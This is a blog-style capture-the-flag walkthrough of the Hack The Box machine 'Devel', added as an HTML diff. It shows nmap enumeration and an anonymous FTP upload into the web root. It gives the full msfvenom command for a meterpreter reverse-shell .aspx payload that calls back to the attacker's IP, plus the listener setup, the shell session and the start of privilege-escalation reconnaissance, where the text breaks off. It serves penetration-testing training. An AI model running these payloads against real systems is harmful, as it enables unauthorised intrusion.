@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Devel</strong></h1>
+        <em>Released: 15th March 2017 / Pwned: August 27th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Devel gives you anonymous access to an FTP server that also happens to be the web root directory. You upload a reverse shell to gain access to the system and run CVE exploit on a non-upgraded Windows 7 install to elevate to SYSTEM.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.5</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/devel#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/devel#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/inital.txt&nbsp;10.10.10.5<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                21/tcp&nbsp;open&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;ftpd<br>
+                |&nbsp;ftp-anon:&nbsp;Anonymous&nbsp;FTP&nbsp;login&nbsp;allowed&nbsp;(FTP&nbsp;code&nbsp;230)<br>
+                |&nbsp;03-18-17&nbsp;&nbsp;02:06AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aspnet_client<br>
+                |&nbsp;03-17-17&nbsp;&nbsp;05:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;689&nbsp;iisstart.htm<br>
+                |_03-17-17&nbsp;&nbsp;05:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;184946&nbsp;welcome.png<br>
+                |&nbsp;ftp-syst:&nbsp;<br>
+                |_&nbsp;&nbsp;SYST:&nbsp;Windows_NT<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;7.5<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE<br>
+                |_http-server-header:&nbsp;Microsoft-IIS/7.5<br>
+                |_http-title:&nbsp;IIS7<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type:&nbsp;phone|general&nbsp;purpose|specialized<br>
+                Running&nbsp;(JUST&nbsp;GUESSING):&nbsp;Microsoft&nbsp;Windows&nbsp;Phone|2008|7|8.1|Vista|2012&nbsp;(92%)<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 21/ftp - Anonymous access is allowed, and the files in the ftp are listed by nmap<br>
+        • 80/http - A website, which is always useful to check out<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 21/ftp</strong></h2><br>
+        The FTP server allows for anonymous access, so log in to the FTP server with a username of <code>anonymous</code> and a random password<br>
+            <div class="codebox">
+                root@gotham:~/ctf/devel#&nbsp;mkdir&nbsp;ftp<br>
+                root@gotham:~/ctf/devel#&nbsp;cd&nbsp;ftp<br>
+                root@gotham:~/ctf/devel/ftp#&nbsp;ftp&nbsp;10.10.10.5<br>
+                Connected&nbsp;to&nbsp;10.10.10.5.<br>
+                220&nbsp;Microsoft&nbsp;FTP&nbsp;Service<br>
+                Name&nbsp;(10.10.10.5:root):&nbsp;anonymous<br>
+                331&nbsp;Anonymous&nbsp;access&nbsp;allowed,&nbsp;send&nbsp;identity&nbsp;(e-mail&nbsp;name)&nbsp;as&nbsp;password.<br>
+                Password:<br>
+                230&nbsp;User&nbsp;logged&nbsp;in.<br>
+                Remote&nbsp;system&nbsp;type&nbsp;is&nbsp;Windows_NT.<br>
+                ftp&gt;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Have a look at the files in the FTP server<br>
+            <div class="codebox">
+                ftp&gt;&nbsp;ls<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                03-18-17&nbsp;&nbsp;02:06AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aspnet_client<br>
+                03-17-17&nbsp;&nbsp;05:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;689&nbsp;iisstart.htm<br>
+                03-17-17&nbsp;&nbsp;05:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;184946&nbsp;welcome.png<br>
+                226&nbsp;Transfer&nbsp;complete.
+            </div>
+        </div><br>
+        <br>
+        Judging by the contents of the directory, this ftp directory is also the root directory of the webserver:<br>
+        <code>iisstart.htm</code>, <code>welcome.png</code> and <code>aspnet_client</code>.<br>
+        <br>
+        Check this is true by visiting <code>iisstart.htm</code> or <code>welcome.png</code> on the website - <code>http://10.10.10.5/welcome.png</code><br>
+        If the page loads, we know this ftp directory is also the web root directory.<br>
+        <br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Nice! We have access to the web root directory via FTP.<br>
+        With <code>put</code>, you can upload files to the website.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/devel/ftp#&nbsp;echo&nbsp;"hihi"&nbsp;&gt;&nbsp;pls.txt
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                ftp&gt;&nbsp;put&nbsp;pls.txt<br>
+                local:&nbsp;pls.txt&nbsp;remote:&nbsp;pls.txt<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                6&nbsp;bytes&nbsp;sent&nbsp;in&nbsp;0.00&nbsp;secs&nbsp;(33.1038&nbsp;kB/s)<br>
+                ftp&gt;&nbsp;ls<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                03-18-17&nbsp;&nbsp;02:06AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aspnet_client<br>
+                03-17-17&nbsp;&nbsp;05:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;689&nbsp;iisstart.htm<br>
+                08-30-19&nbsp;&nbsp;09:01PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6&nbsp;pls.txt<br>
+                03-17-17&nbsp;&nbsp;05:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;184946&nbsp;welcome.png<br>
+                226&nbsp;Transfer&nbsp;complete.
+            </div>
+        </div><br>
+        <br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) msfvenom Reverse Shell</strong></h2><br>
+        With the ability to upload files to the webserver, we can upload a <code>.aspx</code> reverse shell and get a shell on the system.<br>
+        <br>
+        Generate a reverse shell payload using <code>msfvenom</code>.<br>
+        A 32-bit payload is the safest option here considering that we don't know the architecture of the target system. (and a 32-bit payload will work on both 32-bit and 64-bit machines)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/devel#&nbsp;msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=10.10.14.6&nbsp;LPORT=9001&nbsp;-f&nbsp;aspx&nbsp;-o&nbsp;toucan.aspx<br>
+                [-]&nbsp;No&nbsp;platform&nbsp;was&nbsp;selected,&nbsp;choosing&nbsp;Msf::Module::Platform::Windows&nbsp;from&nbsp;the&nbsp;payload<br>
+                [-]&nbsp;No&nbsp;arch&nbsp;selected,&nbsp;selecting&nbsp;arch:&nbsp;x86&nbsp;from&nbsp;the&nbsp;payload<br>
+                No&nbsp;encoder&nbsp;or&nbsp;badchars&nbsp;specified,&nbsp;outputting&nbsp;raw&nbsp;payload<br>
+                Payload&nbsp;size:&nbsp;341&nbsp;bytes<br>
+                Final&nbsp;size&nbsp;of&nbsp;aspx&nbsp;file:&nbsp;2835&nbsp;bytes<br>
+                Saved&nbsp;as:&nbsp;toucan.aspx
+            </div>
+        </div><br>
+        <br>
+        Start a meterpreter listener in metasploit.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/devel#&nbsp;msfconsole<br>
+                ...<br>
+                <br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/handler<br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;payload&nbsp;windows/meterpreter/reverse_tcp<br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;10.10.14.6<br>
+                LHOST&nbsp;=&gt;&nbsp;10.10.14.6<br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;9001<br>
+                LPORT&nbsp;=&gt;&nbsp;9001<br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;show&nbsp;options<br>
+                <br>
+                Module&nbsp;options&nbsp;(exploit/multi/handler):<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------<br>
+                <br>
+                <br>
+                Payload&nbsp;options&nbsp;(windows/meterpreter/reverse_tcp):<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;EXITFUNC&nbsp;&nbsp;process&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exit&nbsp;technique&nbsp;(Accepted:&nbsp;'',&nbsp;seh,&nbsp;thread,&nbsp;process,&nbsp;none)<br>
+                &nbsp;&nbsp;&nbsp;LHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.14.6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;listen&nbsp;address&nbsp;(an&nbsp;interface&nbsp;may&nbsp;be&nbsp;specified)<br>
+                &nbsp;&nbsp;&nbsp;LPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;listen&nbsp;port<br>
+                <br>
+                <br>
+                Exploit&nbsp;target:<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----<br>
+                &nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Wildcard&nbsp;Target<br>
+                <br>
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.6:9001&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Upload the reverse shell to the web server via ftp<br>
+            <div class="codebox">
+                ftp&gt;&nbsp;put&nbsp;toucan.aspx<br>
+                local:&nbsp;toucan.aspx&nbsp;remote:&nbsp;toucan.aspx<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                2871&nbsp;bytes&nbsp;sent&nbsp;in&nbsp;0.00&nbsp;secs&nbsp;(16.1059&nbsp;MB/s)<br>
+                ftp&gt;&nbsp;ls<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                03-18-17&nbsp;&nbsp;02:06AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aspnet_client<br>
+                03-17-17&nbsp;&nbsp;05:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;689&nbsp;iisstart.htm<br>
+                08-30-19&nbsp;&nbsp;09:22PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2871&nbsp;toucan.aspx<br>
+                03-17-17&nbsp;&nbsp;05:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;184946&nbsp;welcome.png<br>
+                226&nbsp;Transfer&nbsp;complete.
+            </div>
+        </div><br>
+        <br>
+        And visit your <code>.aspx</code> reverse shell on the site.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        You should receive a call back on your listener.<br>
+            <div class="codebox">
+                ...<br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.6:9001&nbsp;<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;(179779&nbsp;bytes)&nbsp;to&nbsp;10.10.10.5<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;2&nbsp;opened&nbsp;(10.10.14.6:9001&nbsp;-&gt;&nbsp;10.10.10.5:49158)&nbsp;at&nbsp;2019-08-27&nbsp;11:40:24&nbsp;+0100<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;sysinfo<br>
+                Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;DEVEL<br>
+                OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Windows&nbsp;7&nbsp;(Build&nbsp;7600).<br>
+                Architecture&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86<br>
+                System&nbsp;Language&nbsp;:&nbsp;el_GR<br>
+                Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;HTB<br>
+                Logged&nbsp;On&nbsp;Users&nbsp;:&nbsp;0<br>
+                Meterpreter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86/windows
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) SYSTEM</strong></h2><br>
+        Drop into a shell and run <code>systeminfo</code> to check if the machine has been updated.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;shell<br>
+                Process&nbsp;2644&nbsp;created.<br>
+                Channel&nbsp;1&nbsp;created.<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.1.7600]<br>
+                Copyright&nbsp;(c)&nbsp;2009&nbsp;Microsoft&nbsp;Corporation.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                c:\windows\system32\inetsrv&gt;systeminfo<br>
+                systeminfo<br>
+                <br>
+                Host&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEVEL<br>
+                OS&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;7&nbsp;Enterprise&nbsp;<br>
+                OS&nbsp;Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.1.7600&nbsp;N/A&nbsp;Build&nbsp;7600<br>
+                OS&nbsp;Manufacturer:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Corporation<br>
+                OS&nbsp;Configuration:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Standalone&nbsp;Workstation<br>
+                OS&nbsp;Build&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Multiprocessor&nbsp;Free<br>
+                Registered&nbsp;Owner:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;babis<br>
+                Registered&nbsp;Organization:&nbsp;&nbsp;&nbsp;<br>
+                Product&nbsp;ID:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;55041-051-0948536-86302<br>
+                Original&nbsp;Install&nbsp;Date:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17/3/2017,&nbsp;4:17:31&nbsp;��<br>
+                System&nbsp;Boot&nbsp;Time:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;31/8/2019,&nbsp;3:33:49&nbsp;��<br>
+                System&nbsp;Manufacturer:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VMware,&nbsp;Inc.<br>
+                System&nbsp;Model:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VMware&nbsp;Virtual&nbsp;Platform<br>
+                System&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;X86-based&nbsp;PC<br>
+                Processor(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;Processor(s)&nbsp;Installed.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;x64&nbsp;Family&nbsp;23&nbsp;Model&nbsp;1&nbsp;Stepping&nbsp;2&nbsp;AuthenticAMD&nbsp;~2000&nbsp;Mhz<br>
+                BIOS&nbsp;Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Phoenix&nbsp;Technologies&nbsp;LTD&nbsp;6.00,&nbsp;12/12/2018<br>
+                Windows&nbsp;Directory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows<br>
+                System&nbsp;Directory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32<br>
+                Boot&nbsp;Device:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\Device\HarddiskVolume1<br>
+                System&nbsp;Locale:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;el;Greek<br>
+                Input&nbsp;Locale:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;en-us;English&nbsp;(United&nbsp;States)<br>
+                Time&nbsp;Zone:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(UTC+02:00)&nbsp;Athens,&nbsp;Bucharest,&nbsp;Istanbul<br>
+                Total&nbsp;Physical&nbsp;Memory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.023&nbsp;MB<br>
+                Available&nbsp;Physical&nbsp;Memory:&nbsp;686&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;Max&nbsp;Size:&nbsp;&nbsp;2.047&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;Available:&nbsp;1.527&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;In&nbsp;Use:&nbsp;&nbsp;&nbsp;&nbsp;520&nbsp;MB<br>
+                Page&nbsp;File&nbsp;Location(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\pagefile.sys<br>
+                Domain:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTB<br>
+                Logon&nbsp;Server:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N/A<br>
+                Hotfix(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N/A<br>
+                Network&nbsp;Card(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;NIC(s)&nbsp;Installed.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;Intel(R)&nbsp;PRO/1000&nbsp;MT&nbsp;Network&nbsp;Connection<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connection&nbsp;Name:&nbsp;Local&nbsp;Area&nbsp;Connection<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DHCP&nbsp;Enabled:&nbsp;&nbsp;&nbsp;&nbsp;No<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP&nbsp;address(es)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;10.10.10.5<br>
+                <br>
+                c:\windows\system32\inetsrv&gt;exit<br>
+                exit<br>
+                meterpreter&nbsp;&gt;&nbsp;background
+            </div>
+        </div><br>
+        <br>
+        The face that Hotfix reads N/A - <code>Hotfix(s): N/A</code> - means that this machine (most likely) hasn't been updated.<br>
+        There should be plenty of exploits for a non-updated Windows 7 box.<br>
+        <br>
+        Use the <code>post/multi/recon/local_exploit_suggester</code> module to find exploits for the target machine.<br>
+            <div class="codebox">
+                msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;use&nbsp;post/multi/recon/local_exploit_suggester<br>
+                msf5&nbsp;post(multi/recon/local_exploit_suggester)&nbsp;&gt;&nbsp;show&nbsp;options<br>
+                <br>
+                Module&nbsp;options&nbsp;(post/multi/recon/local_exploit_suggester):<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------<br>
